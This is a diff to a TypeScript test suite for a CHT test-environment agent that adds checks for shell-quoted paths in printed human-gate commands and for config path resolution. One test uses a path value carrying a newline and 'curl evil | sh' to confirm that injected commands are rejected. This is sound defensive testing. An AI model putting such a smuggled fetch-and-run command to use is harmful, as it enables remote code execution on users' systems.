@@ -83,6 +83,15 @@ describe('TestEnvironmentAgent', () => {
       }
     });
 
+    it('should reject a chtCorePath containing control characters (it is printed into human-gate commands)', async () => {
+      try {
+        await agent.provision({ chtCorePath: '/srv/cht-core\ncurl evil | sh' });
+        expect.fail('Should have thrown an error');
+      } catch (error) {
+        expect((error as Error).message).to.include('control characters');
+      }
+    });
+
     describe('real mode (useMockDocker: false)', () => {
       let fetchStub: sinon.SinonStub;
       // Provision reads these; isolate every test from the ambient env.
@@ -119,6 +128,17 @@ describe('TestEnvironmentAgent', () => {
         expect(handle.auth).to.deep.equal({ user: 'medic', password: 'password' });
         expect(handle.network).to.equal('cht-agent-net');
         expect(handle.chtCorePath).to.equal('/workspace/cht-core');
+      });
+
+      it('should print the bring-up gate with the cht-core path shell-quoted', async () => {
+        fetchStub.resolves({ ok: true, status: 200 });
+        const logSpy = sinon.spy(console, 'log');
+        const realAgent = new TestEnvironmentAgent({ useMockDocker: false });
+
+        await realAgent.provision({ chtCorePath: '/workspace/cht-core' });
+
+        const lines = logSpy.getCalls().map((call) => String(call.args[0]));
+        expect(lines.some((line) => line.includes("scripts/test-env-up.sh '/workspace/cht-core'"))).to.equal(true);
       });
 
       it('should reject if the environment never becomes ready', async () => {
@@ -245,12 +265,12 @@ describe('TestEnvironmentAgent', () => {
   });
 
   describe('applyConfig', () => {
-    it('should default to config/default and run all four upload buckets', async () => {
+    it('should default to config/default under the handle chtCorePath and run the four standard buckets', async () => {
       const handle = await provisionMock();
 
       const result = await agent.applyConfig(handle);
 
-      expect(result.configPath).to.equal('config/default');
+      expect(result.configPath).to.equal('/workspace/cht-core/config/default');
       expect(result.succeeded).to.equal(true);
       expect(result.warnings).to.deep.equal([]);
       expect(result.actions.map((action) => action.action)).to.deep.equal([
@@ -391,6 +411,43 @@ describe('TestEnvironmentAgent', () => {
         await realAgent.applyConfig(dockerHandle, { actions: ['app-forms'], artifact: 'pregnancy' });
 
         expect(runBucketStub.firstCall.args[0].artifact).to.equal('pregnancy');
+      });
+
+      it('should resolve the default config/default against the handle chtCorePath, pinning the cwd', async () => {
+        const realAgent = new TestEnvironmentAgent({ useMockDocker: false });
+        const handleWithCore = { ...dockerHandle, chtCorePath: '/workspace/cht-core' };
+
+        await realAgent.applyConfig(handleWithCore, { actions: ['app-settings'] });
+
+        const passed = runBucketStub.firstCall.args[0];
+        expect(passed.configPath).to.equal('/workspace/cht-core/config/default');
+        expect(passed.cwd).to.equal('/workspace/cht-core/config/default');
+      });
+
+      it('should leave the cwd unset for a relative configPath (no chtCorePath to resolve against)', async () => {
+        const realAgent = new TestEnvironmentAgent({ useMockDocker: false });
+
+        await realAgent.applyConfig(dockerHandle, { actions: ['app-settings'] });
+
+        const passed = runBucketStub.firstCall.args[0];
+        expect(passed.configPath).to.equal('config/default');
+        expect(passed.cwd).to.equal(undefined);
+      });
+
+      it('should thread bin and timeoutMs through to the runner (deployment-pinned cht-conf, long form sets)', async () => {
+        const realAgent = new TestEnvironmentAgent({ useMockDocker: false });
+
+        await realAgent.applyConfig(dockerHandle, {
+          configPath: '/mnt/conf',
+          actions: ['app-forms'],
+          bin: '/mnt/conf/node_modules/.bin/cht',
+          timeoutMs: 600_000,
+        });
+
+        const passed = runBucketStub.firstCall.args[0];
+        expect(passed.bin).to.equal('/mnt/conf/node_modules/.bin/cht');
+        expect(passed.timeoutMs).to.equal(600_000);
+        expect(passed.cwd).to.equal('/mnt/conf');
       });
 
       it('should report succeeded:false when a bucket fails, without aborting the rest', async () => {
@@ -788,12 +845,29 @@ describe('TestEnvironmentAgent', () => {
         realAgent = new TestEnvironmentAgent({ useMockDocker: false });
       });
 
-      it('should resolve the restart tier (human-gated, agent runs no Docker)', async () => {
-        expect(await realAgent.reset(dockerHandle, 'restart')).to.be.undefined;
+      afterEach(() => {
+        sinon.restore();
       });
 
-      it('should resolve the full tier (human-gated, agent runs no Docker)', async () => {
-        expect(await realAgent.reset(dockerHandle, 'full')).to.be.undefined;
+      it('should print a runnable restart gate quoting the cht-core path (human-gated, agent runs no Docker)', async () => {
+        const logSpy = sinon.spy(console, 'log');
+
+        await realAgent.reset(dockerHandle, 'restart');
+
+        const lines = logSpy.getCalls().map((call) => String(call.args[0]));
+        expect(lines.some((line) => line.includes("scripts/test-env-restart.sh '/workspace/cht-core'"))).to.equal(
+          true
+        );
+      });
+
+      it('should print the full-tier gate naming both scripts with the quoted path', async () => {
+        const logSpy = sinon.spy(console, 'log');
+
+        await realAgent.reset(dockerHandle, 'full');
+
+        const lines = logSpy.getCalls().map((call) => String(call.args[0]));
+        const expected = "scripts/test-env-down.sh '/workspace/cht-core' && scripts/test-env-up.sh '/workspace/cht-core'";
+        expect(lines.some((line) => line.includes(expected))).to.equal(true);
       });
 
       describe('couchdb tier (the agent-owned reset)', () => {
@@ -981,6 +1055,23 @@ describe('TestEnvironmentAgent', () => {
           expect(fetchDocRevsStub.firstCall.args[2]).to.deep.equal(['place-1', 'person-1']);
         });
 
+        it('should reseed with the same bin/timeoutMs the seed ran with (no version or timeout skew)', async () => {
+          runChtConfStub.resolves(okRun(ansiInfo('Summary: 2 of 2 docs uploaded OK.')));
+          await agentUnderTest.prepareTestData(dockerHandle, seedConfig, {
+            dataPath,
+            bin: '/mnt/test-data/node_modules/.bin/cht',
+            timeoutMs: 240_000,
+          });
+          runChtConfStub.resetHistory();
+          runChtConfStub.resolves(okRun(ansiInfo('Summary: 2 of 2 docs uploaded OK.')));
+
+          await agentUnderTest.reset(dockerHandle, 'couchdb');
+
+          const reseedCall = runChtConfStub.lastCall.args[0];
+          expect(reseedCall.bin).to.equal('/mnt/test-data/node_modules/.bin/cht');
+          expect(reseedCall.timeoutMs).to.equal(240_000);
+        });
+
         it('should clear the tracking on teardown, so a later couchdb reset is a no-op', async () => {
           await seedTracking();
 
@@ -1000,7 +1091,7 @@ describe('TestEnvironmentAgent', () => {
       expect(await agent.teardown(handle)).to.equal(undefined);
     });
 
-    it('should resolve in real mode (prints the human teardown gate)', async () => {
+    it('should print the human teardown gate with the cht-core path shell-quoted (real mode)', async () => {
       const realAgent = new TestEnvironmentAgent({ useMockDocker: false });
       const handle: EnvironmentHandle = {
         url: 'https://nginx',
@@ -1009,8 +1100,13 @@ describe('TestEnvironmentAgent', () => {
         chtCorePath: '/workspace/cht-core',
         source: 'docker',
       };
+      const logSpy = sinon.spy(console, 'log');
 
-      expect(await realAgent.teardown(handle)).to.be.undefined;
+      await realAgent.teardown(handle);
+
+      logSpy.restore();
+      const lines = logSpy.getCalls().map((call) => String(call.args[0]));
+      expect(lines.some((line) => line.includes("scripts/test-env-down.sh '/workspace/cht-core'"))).to.equal(true);
     });
   });
 });
